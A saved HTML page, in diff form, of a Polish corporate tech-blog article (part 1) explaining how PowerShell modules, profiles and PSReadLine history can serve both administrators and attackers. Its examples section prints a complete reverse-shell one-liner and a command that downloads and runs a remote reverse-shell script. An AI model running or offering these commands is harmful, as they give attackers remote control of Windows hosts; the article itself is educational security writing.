@@ -1,0 +1,461 @@
+<html lang="pl" data-platform-name="Firefox" data-platform-version="126.0" data-platform-layout="Gecko" data-platform-os="Windows 10 64-bit" data-platform-description="Firefox 126.0 on Windows 10 64-bit"><head itemscope="">
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="/_static/css/app-shell.fb9807d7e7ed5c68076b.css" rel="stylesheet" type="text/css" data-type="app-shell">
+            <link rel="shortcut icon" href="/_static/icon/favicon.240313eb651325fefc54.ico">
+            <link rel="apple-touch-icon" href="/_static/icon/apple-touch-icon.e2b8d0f81880c3bda963.png">
+        <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
+                <meta property="og:site_name" class="contentMetaTag" content="Tech Blog">
+    <title>Moduły PowerShell – wsparcie leniwego admina czy szwajcarski scyzoryk hakera</title>
+    <meta property="og:title" class="contentMetaTag" content="Moduły PowerShell – wsparcie leniwego admina czy szwajcarski scyzoryk hakera">
+    <meta name="description" class="contentMetaTag" content="Jeżeli istnieje administrator, który nigdy niczego nie zautomatyzował na komputerze, niech pierwszy rzuci kamieniem!
+Możliwości powershella są prawie nieograniczone – od lat przekonują się o tym administratorzy i hakerzy na całym świecie. C Całkowita jego eliminacja w organizacji jest bardzo trudna lub wręcz niemożliwa – każdy zespół blue team ma z powershellem niemałą zagwozdkę.">
+    <meta name="keywords" class="contentMetaTag" content="test">
+    <meta property="og:locale" class="contentMetaTag" content="pl_PL">
+    <meta property="og:description" class="contentMetaTag" content="Jeżeli istnieje administrator, który nigdy niczego nie zautomatyzował na komputerze, niech pierwszy rzuci kamieniem!
+Możliwości powershella są prawie nieograniczone – od lat przekonują się o tym administratorzy i hakerzy na całym świecie. C Całkowita jego eliminacja w organizacji jest bardzo trudna lub wręcz niemożliwa – każdy zespół blue team ma z powershellem niemałą zagwozdkę.">
+    <meta property="twitter:description" class="contentMetaTag" content="Jeżeli istnieje administrator, który nigdy niczego nie zautomatyzował na komputerze, niech pierwszy rzuci kamieniem!
+Możliwości powershella są prawie nieograniczone – od lat przekonują się o tym administratorzy i hakerzy na całym świecie. C Całkowita jego eliminacja w organizacji jest bardzo trudna lub wręcz niemożliwa – każdy zespół blue team ma z powershellem niemałą zagwozdkę.">
+    <meta property="article:published_time" class="contentMetaTag" content="2022-10-25T00:00:00">
+    <meta property="article:modified_time" class="contentMetaTag" content="2022-10-26T10:44:30.765">
+    
+    <meta name="robots" class="contentMetaTag" content="index, follow, noodp, noydir">
+    <link rel="canonical" class="contentMetaTag" href="https://techblog.ing.pl/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1">
+    <meta name="google-site-verification" content="Ogv2Msh-I1oI9Kd3QK6JqZjy7GUB47-XWg3ZMqJPS4M" class="contentMetaTag">
+
+
+
+        <link data-type="component" data-id="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1" rel="stylesheet" type="text/css" href="/_static/css/comp/comp-content.c4dc825da81725c92590.css">
+        <link data-type="component" data-id="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1" rel="stylesheet" type="text/css" href="/_static/css/comp/comp-content.a566bd646a434d16477a.css">
+        <link data-type="component" data-id="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1" rel="stylesheet" type="text/css" href="/_static/css/comp/comp-breadcrumbs.ec0af211211a62d537be.css">
+        <link data-type="component" data-id="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1" rel="stylesheet" type="text/css" href="/_static/css/comp/comp-floating_menu_right.9f7d3b0387155672af2e.css">
+        <link data-type="component" data-id="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1" rel="stylesheet" type="text/css" href="/_static/css/comp/comp-page_title.002bd6f0b134ebfd3352.css">
+        <link data-type="component" data-id="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1" rel="stylesheet" type="text/css" href="/_static/css/comp/comp-related_articles.6986b5a6849912b62865.css">
+        <link data-type="component" data-id="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1" rel="stylesheet" type="text/css" href="/_static/css/comp/comp-this_article_tags.eca5dcf66ab404f123e9.css">
+        <link data-type="header" data-id="1500057.23e2437e85badea5acc2f33b37c8c5dc115fc2f520b6a744a8b118fb0d76402b" rel="stylesheet" type="text/css" href="/_static/css/header.51fcb589883afe414c3c.css">
+        <link data-type="footer" data-id="1500019.56896b9fcf4f28cde2bdcf2032ce2f44c618c4ae71d0c5d03494a1aa9393143a" rel="stylesheet" type="text/css" href="/_static/css/footer.a7e57726b71847e402b8.css">
+        <link data-type="template" data-id="1500004.edd99fc91705e9259eb508743cec30254c512c6ef8044abbcaea4e32fce6f670" rel="stylesheet" type="text/css" href="/_static/template-manager/ingbank/css/vs.21a874f8da74847aa749.css">
+    <link data-id="/_api/core/user-component/tab_layout_search_header.7e5ce97ee30c9769694557153d3215d7df6ab3c60d789919689cebd5c0c9ef63" data-type="user-component" rel="stylesheet" type="text/css" loaded="yes" crossorigin="anonymous" href="/_static/user-component/tab_layout_search_header/tab_layout_search_header.068e5a606d772ecbfcef.css"><script src="https://techblog-ing.disqus.com/embed.js" data-name="disqusScript" data-timestamp="1718453105652"></script></head>
+    <body class="size_large">
+        <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WW6KXX2"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0], j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','GTM-WW6KXX2');</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WW6KXX2" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+        <main id="site-wrapper">
+            <div id="content-wrapper" data-resource-id="1500004.edd99fc91705e9259eb508743cec30254c512c6ef8044abbcaea4e32fce6f670" data-prerendering="true" data-rules="[]">
+                    <div id="outlet-header" class="outlet outlet-header" data-resource-id="1500057.23e2437e85badea5acc2f33b37c8c5dc115fc2f520b6a744a8b118fb0d76402b">
+                        <div class="layout_section header_section layout_element">
+ <div class="layout_container layout_element">
+  <div class="layout_row row layout_element">
+   <div class="layout_column col-xs-12 col-sm-12 col-md-12 col-lg-12 layout_element">
+    <div class="component header" data-component-type-code="header"> 
+     <div class="header--techblog"> 
+      <div class="logo-group"> 
+       <div class="right_part"> 
+        <div class="login_panel"> 
+         <div class="box_inner"> 
+          <div class="header_icons"> 
+           <div class="right"> 
+            <span class="menu_icon"> <span class="icon_menu"></span> </span> 
+           </div> 
+           <div class="clearFix">
+            &nbsp;
+           </div> 
+          </div> 
+         </div> 
+        </div> 
+       </div> 
+       <div class="left"> 
+        <div class="logo"> 
+         <a href="/" class="logo-image" aria-label="Tech Blog - Przejdź do strony głównej"><img src="/_fileserver/item/1100100.9a14ac40f75d10c88d424701eb8ac4bf840b00627eb6c4585aa59fe6f60fc7c6" alt="ING Bank Śląski S.A. - logotyp"> <p>Tech Blog</p> </a> 
+        </div> 
+       </div> 
+       <div class="submenu"> 
+        <div class="additives"> 
+         <div class="searchbar"> 
+          <cms-user-component src="/_api/core/user-component/tab_layout_search_header.7e5ce97ee30c9769694557153d3215d7df6ab3c60d789919689cebd5c0c9ef63" class="js-cms-userComponent cms-userComponent" loaded="yes"><!----><div class="content_area"><!----><div class="search_box">
+  <div class="decor">
+    <div class="underline">
+    <a href="javascript:fn.SiteSearchValidator.submitSearchForm('site-search-form-mini');" class="search_btn"><span>Szukaj</span></a>
+    <form id="site-search-form-mini" action="javascript:fn.SiteSearchValidator.submitSearchForm('site-search-form-mini');">
+      <input name="q" class="search_field" placeholder="Wyszukaj">
+        </form>
+    </div>
+  </div>
+</div>
+<!----></div><!----></cms-user-component> 
+          <div class="social_icons" role="navigation" aria-label="media społecznościowe"> 
+           <ul> 
+            <li class="social_icon_twitter"><a class="gtm-social-icon-twitter" target="_blank" rel="noopener noreferrer" href="https://twitter.com/INGBankSlaski">Twitter</a></li> 
+            <li class="social_icon_meetup"><a class="gtm-social-icon-meetup" target="_blank" rel="noopener noreferrer" href=" https://www.meetup.com/pl-PL/Enterprise-Tech-Solutions-Meetup/">Enterprise Tech Solutions Meetup</a></li> 
+            <li class="social_icon_rss"><a class="gtm-social-icon-rss" target="_blank" rel="noopener noreferrer" href="/rss">RSS Feed</a></li> 
+           </ul> 
+          </div> 
+         </div> 
+        </div> 
+        <div class="clearFix">
+         &nbsp;
+        </div> 
+        <div class="navi_panel"> 
+         <cms-menu src="/_api/core/menu/menu-nawigacyjne.438e15b5e58e6d922e96c3a3949818738807ea07a09f72d0ad5b2ab253f6ef4b" class="js-cms-cmsMenu cms-cmsMenu" loaded="yes"><!---->
+        <ul class="menu_list">
+        <!---->
+            <li class="node ">
+                
+            <a href="https://techblog.ing.pl/o-nas" class="" aria-current="false">
+                
+        <span class="cms-menu__label"><!---->O nas<!----></span>
+    
+            </a>
+        
+                
+            </li>
+        <!---->
+            <li class="node ">
+                
+            <a href="https://www.ing.pl/pionteching" class="" aria-current="false">
+                
+        <span class="cms-menu__label"><!---->Oferty pracy<!----></span>
+    
+            </a>
+        
+                
+            </li>
+        <!---->
+            <li class="node ">
+                
+            <a href="https://techblog.ing.pl/it-women" class="" aria-current="false">
+                
+        <span class="cms-menu__label"><!---->Podcast BreakIT Girls<!----></span>
+    
+            </a>
+        
+                
+            </li>
+        <!---->
+            <li class="node ">
+                
+            <a href="https://techblog.ing.pl/techmeeting" class="" aria-current="false">
+                
+        <span class="cms-menu__label"><!---->Tech MeetING<!----></span>
+    
+            </a>
+        
+                
+            </li>
+        <!---->
+        </ul>
+    <!----></cms-menu> 
+        </div> 
+        <div class="quick_links"> 
+        </div> 
+       </div> 
+      </div> 
+      <div class="header_underlayer"></div> 
+     </div> 
+     <div class="clearFix">
+      &nbsp;
+     </div> 
+    </div>
+   </div>
+  </div>
+ </div>
+</div>
+                    </div>
+                    <div id="outlet-content" data-content-status="page" class="outlet outlet-content pageTransitionOut" data-resource-id="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1">
+                        <div class="layout_element layout_section">
+ <div class="layout_element layout_container">
+  <div class="layout_element layout_row row">
+   <div class="layout_element layout_column col-xs-12 col-sm-12 col-md-12 col-lg-12">
+    <div id="component_wrapper_1403325248" class="layout_element component_wrapper wrapped_breadcrumbs">
+     <div class="component breadcrumbs component_1403325248" data-component-id="1403325248" data-component-type-code="breadcrumbs" data-js-parameters="{&quot;getAjaxComponentUrl&quot;:&quot;/_api/ds/ingrwd-lds/component_action?component.action\u003dget_ajax_component\u0026component.id\u003d1403325248\u0026component.site\u003dQLmeEYC8HoCjSlYxcQoUUw\u003d\u003d&quot;}" id="breadcrumbs_1_13032019"><nav class="breadcrumbs__inner" itemscope="" itemtype="https://schema.org/BreadcrumbList" aria-label="nawigacja okruszkowa"><ul><li itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem"><a class="home" itemprop="item" aria-label="Strona główna" href="/"><span itemprop="name">Strona główna</span></a><meta content="1" itemprop="position"></li><li class="breadcrumb_item" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem"><a itemprop="item" class="breadcrumb_element" href="/blog"><span itemprop="name">Tech Blog ING Bank Śląski</span></a><meta itemprop="position" content="2"></li><li class="breadcrumb_item" itemprop="itemListElement" itemscope="" itemtype="https://schema.org/ListItem"><a itemprop="item" aria-current="page" class="breadcrumb_element current_element" href="/blog/moduly-powershell-wsparcie-leniwego-admina-czy-szwajcarski-scyzoryk-hakera-czesc1"><span itemprop="name">Moduły PowerShell – wsparcie leniwego admina czy szwajcarski scyzoryk hakera - część 1</span></a><meta itemprop="position" content="3"></li></ul></nav><div class="clearFix"></div></div>
+    </div>
+   </div>
+  </div>
+ </div>
+</div>
+<div class="layout_element layout_section">
+ <div class="layout_element layout_container">
+  <div class="layout_element no_border layout_row row floating-rightmenu-container">
+   <div class="layout_element layout_column col-xs-12 col-sm-12 col-md-8 col-lg-8">
+    <div id="component_wrapper_1403325244" class="layout_element component_wrapper wrapped_page_title">
+     <div class="component page_title component_1403325244" data-component-id="1403325244" data-component-type-code="page_title" data-js-parameters="{}" id="page_title_1_16032019"> 
+      <h1>Moduły PowerShell – wsparcie leniwego admina czy szwajcarski scyzoryk hakera - część 1</h1> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325245" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325245" data-component-id="1403325245" data-component-type-code="content" data-js-parameters="{}" id="content_1_13032019"> 
+      <div class="content_area" id="1403325245"> 
+       <p class="dateCreated single-article">25.10.2022 | <img alt="" src="/_fileserver/item/w6zfzqt.1d93470f57c21e4c05b32d1a3cbf37fbb11937c99accdc137d730f49b541e021" style="height:50px; width:50px"> <a aria-label="" href="/bartosz-chalek">Bartosz Chałek</a></p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325247" class="layout_element component_wrapper wrapped_this_article_tags">
+     <div class="component this_article_tags component_1403325247" data-component-id="1403325247" data-component-type-code="this_article_tags" data-js-parameters="{}" id="this_article_tags_1_13032019"> 
+      <div class="this_article_tags__list"> 
+       <a class="this_article_tags__anchor" href="/blog?tag=powershell">PowerShell</a> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325243" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325243" data-component-id="1403325243" data-component-type-code="content" data-js-parameters="{}" id="wstep"> 
+      <div class="content_area" id="1403325243"> 
+       <p style="text-align:justify"><strong>Wstęp</strong></p> 
+       <p style="margin-bottom:11px">Jeżeli istnieje administrator, który nigdy niczego nie zautomatyzował na komputerze, niech pierwszy rzuci kamieniem!&nbsp;Możliwości powershella są prawie nieograniczone – od lat przekonują się o tym administratorzy i&nbsp;hakerzy na całym świecie. Całkowita jego eliminacja w organizacji jest bardzo trudna lub wręcz niemożliwa – każdy zespół blue team ma z powershellem niemałą zagwozdkę.</p> 
+       <p style="margin-bottom:11px">&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325242" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325242" data-component-id="1403325242" data-component-type-code="content" data-js-parameters="{}" id="zacznijmy-od-poczatku"> 
+      <div class="content_area" id="1403325242"> 
+       <p style="margin-bottom:11px"><strong>Zacznijmy od początku</strong></p> 
+       <p>Zespoły red i blue bez przerwy prześcigają się w wykorzystywaniu powershella, czy to do ataku i ukrycia swojej obecności w systemie, &nbsp;wykrywania zagrożeń czy też &nbsp;monitoringu systemów.&nbsp;Wystarczy zerknąć na repozytoria github’a. Można znaleźć tam ponad 76 tysięcy repozytoriów z językiem oznaczonym jako powershell.&nbsp;</p> 
+       <p><img alt="" src="/_fileserver/item/tw489dr.22332059cbdf682d4029e27666c3b137e38022464450957acdc94c9b23fd84c3"></p> 
+       <p>Źródło: https://github.com/search?q=language%3APowerShell&amp;type=repositories, data dostępu: 2022-07-19</p> 
+       <p>&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325252" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325252" data-component-id="1403325252" data-component-type-code="content" data-js-parameters="{}" id="przyklady"> 
+      <div class="content_area" id="1403325252"> 
+       <p style="margin-bottom:11px"><strong>Przykłady użycia powershella w automatyzacji</strong></p> 
+       <p style="margin-bottom:11px">Jako atakujący, możemy wykorzystać powershella praktycznie w każdej fazie ataku - &nbsp;np. rozpoczynając od próby zestawienia prostego revershella używając poniższej komendy<span style="font-size:11pt"><span style="line-height:107%"><span style="font-family:Calibri,sans-serif"><span style="font-size:10.5pt"><span style="line-height:107%"><span style="font-family:&quot;ING Me&quot;">.&nbsp;</span></span></span></span></span></span></p> 
+       <p><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "&gt; ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code></p> 
+       <p>&nbsp;</p> 
+       <p>Możemy też łatwo pobrać i uruchomić dowolny skrypt z internetu:</p> 
+       <p><code>powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1') </code></p> 
+       <p>&nbsp;</p> 
+       <p>Dodatkowo, jeżeli mamy jakiś prosty kod w C#, Jscript albo VisualBasic, to możemy go łatwo uruchomić dynamicznie w pamięci:</p> 
+       <p><img alt="" src="/_fileserver/item/nwdt3zr.86dfdfcb669eba898603b7e59f27b96aa8fb1379a2e55aafb9e73ef47a52b473" style="height:267px; width:560px"></p> 
+       <p style="margin-bottom:11px">Źródło: opracowanie własne</p> 
+       <p>&nbsp;</p> 
+       <p>Wystarczy uruchomić PowerShell ISE i spojrzeć na listę dostępnych komend, żeby zobaczyć jak gigantyczne możliwości daje to (standardowo zainstalowane w każdym Windowsie) narzędzie.</p> 
+       <p>&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325253" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325253" data-component-id="1403325253" data-component-type-code="content" data-js-parameters="{}" id="nie-tylko"> 
+      <div class="content_area" id="1403325253"> 
+       <p style="margin-top:3px"><strong>PowerShell nie tylko w powershellu</strong></p> 
+       <p>Co ciekawe, cała logika powershella znajduje się w bibliotece systemowej System.Management.Automation.dll, co oznacza że każde z tych poleceń można też uruchomić bez wyzwalania procesu powershell.exe, a np. za pomocą własnego kodu:</p> 
+       <p><img alt="" src="/_fileserver/item/xzulshl.68b9b27409a03d170b6b5485471664035563316ce142616d79fbd476236fa43b" style="height:356px; width:540px"></p> 
+       <p style="margin-bottom:11px">Źródło: opracowanie własne</p> 
+       <p>&nbsp;</p> 
+       <p>Po kompilacji i uruchomieniu aplikacji, uzyskujemy wykonanie komendy powershella bez uruchomienia procesu powershell.exe.&nbsp;</p> 
+       <p><img alt="" src="/_fileserver/item/zxcsrck.a5be736058f4f491888172e1b7ca286bfe32c010486ebe0713cf78e44063f167" style="height:42px; width:560px"></p> 
+       <p>Źródło: opracowanie własne</p> 
+       <p>&nbsp;</p> 
+       <p>Z biblioteki tej korzystają też inne aplikacje wbudowane w systemie:</p> 
+       <p><img alt="" src="/_fileserver/item/7hxe8rs.39e7d10356b2022a6721ca9753fe6af0a1676768e73e5a2e6db972b78092700d" style="height:205px; width:560px"></p> 
+       <p style="margin-bottom:11px">Źródło: opracowanie własne</p> 
+       <p>&nbsp;</p> 
+       <p>W artykule tym skupimy się nad pewną funkcjonalnością powershella, która rzadko jest opisywana jako jakiekolwiek zagrożenie.&nbsp;</p> 
+       <p>&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325254" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325254" data-component-id="1403325254" data-component-type-code="content" data-js-parameters="{}" id="modly-co-to"> 
+      <div class="content_area" id="1403325254"> 
+       <p style="margin-top:3px"><strong>Moduły? Co to jest? </strong></p> 
+       <p>Strona Microsoft opisuje moduły jak niżej:</p> 
+       <p><img alt="" src="/_fileserver/item/szllde7.4ec412cad7e7998e57e2f347ed58024697ed54c2d7d8fe78b4ae3cdb7975a498" style="height:423px; width:560px"></p> 
+       <p class="MsoCaption" style="margin-bottom:13px">Źródło: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_modules?view=powershell-7.2, data dostępu: 2022-07-19</p> 
+       <p>&nbsp;</p> 
+       <p>W skrócie są to paczki zawierające określone funkcje lub operacje, które mogą &nbsp;być przygotowane w formie skryptów oraz plików DLL.</p> 
+       <p>&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325257" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325257" data-component-id="1403325257" data-component-type-code="content" data-js-parameters="{}" id="pytanie-po-co"> 
+      <div class="content_area" id="1403325257"> 
+       <p style="margin-top:3px"><strong>Pytanie po co?</strong></p> 
+       <p>Tak jak w przypadku jakiegokolwiek systemu pakietów – pozwalają one na implementację zastawu funkcji, a następnie łatwe ich przenoszenie między różnymi środowiskami/serwerami itp.</p> 
+       <p>W sieci można znaleźć wiele tutoriali opisujących sposób utworzenia własnego modułu - <a aria-label="" href="https://docs.microsoft.com/en-us/powershell/scripting/developer/module/how-to-write-a-powershell-script-module?view=powershell-7.2">link.&nbsp;</a></p> 
+       <p>Chcesz stworzyć własny konwerter tekstu do ROT 13, a następnie używać go w wielu różnych skryptach? Stwórz moduł zawierający taką konwersję, a następnie wczytaj go w każdym ze skryptów.</p> 
+       <p>Istnieje nawet specjalna strona zawierająca dostępne do pobrania skrypty i moduły - <a aria-label="" href="https://www.powershellgallery.com/">link.&nbsp;</a></p> 
+       <p>&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325249" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325249" data-component-id="1403325249" data-component-type-code="content" data-js-parameters="{}" id="jak-to-dziala"> 
+      <div class="content_area" id="1403325249"> 
+       <p style="margin-top:3px"><strong>Jak to działa?</strong></p> 
+       <p>Za pomocą komendy Get-Module –ListAvailable, mamy możliwość pobrania wszystkich aktualnie dostępnych modułów zainstalowanych w systemie:</p> 
+       <p><img alt="" src="/_fileserver/item/p29ipkw.b35f46441c8fc536d222b0c12012ac0502c5dc148512d200faaa230fcc63a7b2" style="height:467px; width:560px"></p> 
+       <p>Źródło: opracowanie własne</p> 
+       <p>&nbsp;</p> 
+       <p>Następnie za pomocą komendy Import-Module należy załadować taki moduł. To pozwoli w pełni korzystać z wszystkich funkcji w nim dostępnych. Lista lokalizacji, z których pobierane są moduły znajduje się w zmiennej środowiskowej PSModulePath:</p> 
+       <p><img alt="" src="/_fileserver/item/asw1tvf.2121812d51cc1cdd6430c6a56d322179471fe6ff008f3acbeb2c7dd952ec0aee" style="height:60px; width:560px"></p> 
+       <p>Źródło: opracowanie własne</p> 
+       <p>&nbsp;</p> 
+       <p>Domyślnie lista zawiera katalogi:</p> 
+       <ul> 
+        <li>li&gt;%USERPROFILE%\Documents\WindowsPowerShell\Modules</li> 
+        <li>C:\Program Files\WindowsPowerShell\Modules</li> 
+        <li>C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules</li> 
+       </ul> 
+       <p>&nbsp;</p> 
+       <p>Modułem, który jest ciekawy z punktu bezpieczeństwa, &nbsp;jest moduł PSReadLine,który zapisuje historię komend wydanych przez użytkownika w katalogu - <a href="https://docs.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.2#notes">link:&nbsp;</a></p> 
+       <p><code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine</code></p> 
+       <p>Dla atakującego jest to swoisty .bash_history powershella, z którego czasami można wyciągnąć bardzo ciekawe informacje. Dodatkowym udogodnieniem jest fakt, że moduł ten jest wczytywany automatycznie w momencie interaktywnego uruchomienia konsoli. Zgodnie z opisem z powyższej strony, ładuje się on również w przypadku uruchomienia konsoli Visual Studio Code.</p> 
+       <p>Szybki rzut okiem w systemie pozwala na określenie gdzie ten moduł się znajduje:</p> 
+       <p><img alt="" src="/_fileserver/item/f3dgwvl.8cfe6fd33d6bfd7c622553b2e99fe44e3e87b56bfcea12d4062af2045227a990" style="height:205px; width:560px"></p> 
+       <p style="margin-bottom:11px">Źródło: opracowanie własne</p> 
+       <p style="margin-bottom:11px">&nbsp;</p> 
+       <p style="margin-bottom:11px"><img alt="" src="/_fileserver/item/nvzqwsl.a3d920b33ef9b8e97ff9f3af0f408fca9325341a98dc2e778319c45848524593" style="height:194px; width:560px"></p> 
+       <p style="margin-bottom:11px">Źródło: opracowanie własne</p> 
+       <p style="margin-bottom:11px">&nbsp;</p> 
+       <p style="margin-bottom:11px"><img alt="" src="/_fileserver/item/u73zphd.594f581117fab17c806b4f59fc38e78122c3ad8ba009720590c967fcd5f118e4" style="height:288px; width:560px"></p> 
+       <p style="margin-bottom:11px">Źródło: opracowanie własne</p> 
+       <p style="margin-bottom:11px">&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325258" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325258" data-component-id="1403325258" data-component-type-code="content" data-js-parameters="{}" id="w-organizacji"> 
+      <div class="content_area" id="1403325258"> 
+       <p style="margin-top:3px"><strong>Wykorzystanie modułów w organizacji</strong></p> 
+       <p>Już z wcześniejszego opisu można zauważyć ciekawą rzecz, zmienna środowiskowa PSModulePath zawiera katalog: %USERPROFILE%\Documents\WindowsPowerShell\Modules</p> 
+       <p style="margin-bottom:11px">Częstą praktyką w organizacjach jest tworzenie profilu sieciowego pozwalającego na łatwe przenoszenie profilu użytkownika między wieloma komputerami – zwłaszcza jeśli chodzi o dokumenty użytkownika.</p> 
+       <p>Po wykonaniu powyższego działania, możemy jako użytkownik zaimplementować moduł raz, a następnie używać go w skryptach na każdym komputerze, na którym się zalogujemy, bez konieczności przesyłania go na ten serwer. Wystarczy zsynchronizować profil użytkownika.</p> 
+       <p>Osobie zajmującej się bezpieczeństwem może się zapalić malutka, czerwona lampka – czy to oznacza że można wraz z użytkownikiem przeskakiwać na kolejne systemy?</p> 
+       <p>Odpowiedź brzmi: Tak – ale jak wcześniej widzieliśmy użytkownik musi świadomie taki moduł zaimportować i użyć na danym serwerze.</p> 
+       <p>&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325246" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325246" data-component-id="1403325246" data-component-type-code="content" data-js-parameters="{}" id="execution"> 
+      <div class="content_area" id="1403325246"> 
+       <p style="margin-top:3px"><strong>Execution Policy w obronie użytkownika</strong></p> 
+       <p>Przeglądając katalog %USERPROFILE%\Documents\WindowsPowerShell\ można zauważyć inne pliki, które przenoszą się wraz z profilem użytkownika między serwerami:</p> 
+       <p><img alt="" src="/_fileserver/item/qeoiggf.73f7d1da3f82e07e68031ca3ae57100af93b07b89800720db9b199aee0462522" style="height:311px; width:472px"></p> 
+       <p style="margin-bottom:11px">Źródło: opracowanie własne</p> 
+       <p>&nbsp;</p> 
+       <p>Pliki te pozwalają na wykonanie dowolnych automatycznych akcji dostosowujących konsole powershella przy każdym uruchomieniu – jednak są one domyślnie blokowane przez polityki uruchomienia:</p> 
+       <p><img alt="" src="/_fileserver/item/lewtfmq.228a4085f3f8048abf43fca3c7605390eb51b105b052b8d402bd3409d087409e" style="height:445px; width:498px"></p> 
+       <p>Źródło: opracowanie własne</p> 
+       <p>&nbsp;</p> 
+       <p>W celu ich włączenia, konieczne jest uruchomienie konsoli powershella z flagą ExecutionPolicy Bypass.</p> 
+       <p>&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325250" class="layout_element component_wrapper wrapped_content">
+     <div class="component content component_1403325250" data-component-id="1403325250" data-component-type-code="content" data-js-parameters="{}" id="podsumowanie"> 
+      <div class="content_area" id="1403325250"> 
+       <p style="margin-bottom:11px"><strong>Podsumowanie</strong></p> 
+       <p style="margin-bottom:11px">Nie jest to więc dobry sposób na dodanie naszego importu modułów. Szczególnie jeśli jako atakujący chcemy żeby użytkownik nie był świadom ataku. Jakie więc mamy opcje?&nbsp;O&nbsp;tym wszystkim przeczytasz w drugiej części artykułu.</p> 
+       <p>&nbsp;</p> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325241" class="layout_element component_wrapper wrapped_user_component">
+     <div class="component user_component component_1403325241" data-component-id="1403325241" data-component-type-code="user_component" data-js-parameters="{}" id="user_component_1_22022022"> 
+      <cms-user-component class="js-cms-userComponent cms-userComponent" src="/_api/core/user-component/disqus" loaded="yes"><!----><div class="content_area"><!----><div class="box-default" id="disqus_thread"></div>
+
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript><!----></div><!----></cms-user-component> 
+     </div>
+    </div>
+   </div>
+   <div class="layout_element layout_column col-xs-12 col-sm-12 col-md-4 col-lg-4"><div class="floating_column" style="width: 406.983px; padding-left: 106.996px;">
+    <div id="component_wrapper_1403325255" class="layout_element component_wrapper wrapped_content hidden-sm hidden-xs">
+     <div class="component content component_1403325255" data-component-id="1403325255" data-component-type-code="content" data-js-parameters="{}" id="content_1_16032019"> 
+      <div class="content_area" id="1403325255"> 
+       <h3>Spis treści</h3> 
+      </div> 
+     </div>
+    </div>
+    <div id="component_wrapper_1403325251" class="layout_element component_wrapper wrapped_floating_menu_right hidden-sm hidden-xs">
+     <div class="component floating_menu_right component_1403325251" data-component-id="1403325251" data-component-type-code="floating_menu_right" data-js-parameters="{}" id="floating_menu_right_1_16032019"> 
+      <div id="floating_menu_right_1403325251"> 
